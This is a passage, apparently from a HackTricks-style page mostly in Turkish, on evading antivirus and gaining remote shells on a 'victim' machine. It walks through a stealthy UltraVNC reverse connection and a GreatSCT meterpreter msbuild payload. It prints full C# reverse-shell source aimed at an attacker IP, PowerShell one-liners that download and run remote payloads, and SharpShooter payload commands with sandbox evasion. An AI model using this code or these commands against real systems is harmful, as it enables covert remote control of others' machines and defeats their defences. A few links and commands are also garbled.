Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (kurulum değil, bin indirmelerini almak istiyorsunuz)

**HOST'TA**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _TrayIcon'u Devre Dışı Bırak_ seçeneğini etkinleştirin
- _VNC Şifresi_ kısmına bir şifre girin
- _Sadece Görüntüleme Şifresi_ kısmına bir şifre girin

Ardından, ikili _**winvnc.exe**_ ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **kurbanın** içine taşıyın.

#### **Ters bağlantı**

**saldırgan**, kendi **host'unda** `vncviewer.exe -listen 5900` ikilisini çalıştırmalı, böylece ters **VNC bağlantısını** yakalamaya **hazır** olacaktır. Ardından, **kurban** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın.

**UYARI:** Gizliliği korumak için bazı şeyleri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın, aksi takdirde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın, aksi takdirde [konfigürasyon penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` komutunu çalıştırmayın, aksi takdirde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklersiniz

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **lister'ı başlatın** `msfconsole -r file.rc` ile ve **xml yükünü** **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut savunucu süreci çok hızlı bir şekilde sonlandıracaktır.**

### Kendi ters kabuğumuzu derlemek

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Ters Kabuğu

Bunu ile derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Bunu ile kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# derleyici kullanımı
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
Otomatik indirme ve yürütme:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python kullanarak injector örneği oluşturma:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

{{#include ../banners/hacktricks-training.md}}
